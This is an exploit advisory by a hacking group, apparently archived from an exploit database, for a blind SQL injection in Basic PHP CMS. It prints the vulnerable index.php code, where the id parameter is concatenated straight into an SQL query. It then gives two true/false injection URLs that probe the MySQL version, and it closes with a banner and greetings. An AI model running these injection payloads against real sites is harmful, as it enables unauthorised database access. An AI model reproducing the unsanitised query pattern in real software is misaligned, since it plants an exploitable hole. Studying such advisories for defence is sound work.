@@ -1,0 +1,69 @@
+==================================================================
+  Basic PHP CMS (index.php id) Blind SQL Injection Vulnerability
+==================================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+
+AUTHOR : CWH Underground
+DATE   : 27 November 2008
+SITE   : cwh.citec.us
+
+
+#####################################################
+ APPLICATION : Basic PHP CMS
+ DOWNLOAD    : http://www.content-management-software.us/basiccms.zip
+#####################################################
+
+--- Blind SQL Injection ---
+
+-----------------------------
+ Vulnerable File (index.php)
+-----------------------------
+
+if ($strID != "")
+{
+	$strsql = "SELECT description ";
+	$strsql .=" FROM pages_t_details ";
+	$strsql .=" WHERE id=$strID";
+	$conclass =new DataBase();
+	$rst= $conclass->Execute ($strsql,$strError);
+	if ($strError=="")
+	{
+		while ($line = mysql_fetch_array($rst, MYSQL_ASSOC)) 
+	     {
+			$strDetails=$line['description'];
+		}
+	}
+	
+}
+
+---------
+ Exploit
+---------
+
+Test Blind SQL Injection in MYSQL Version 5
+
+True
+[+] http://[Target]/[basiccms_path]/index.php?id=1 and substring(@@version,1,1)=5--
+
+False
+[+] http://[Target]/[basiccms_path]/index.php?id=1 and substring(@@version,1,1)=4--
+
+
+#######################################################################################
+Greetz      : ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos, Gdiupo, GnuKDE, JK
+Special Thx : asylu3, str0ke, citec.us, milw0rm.com
+#######################################################################################
+
+# milw0rm.com [2008-11-28]
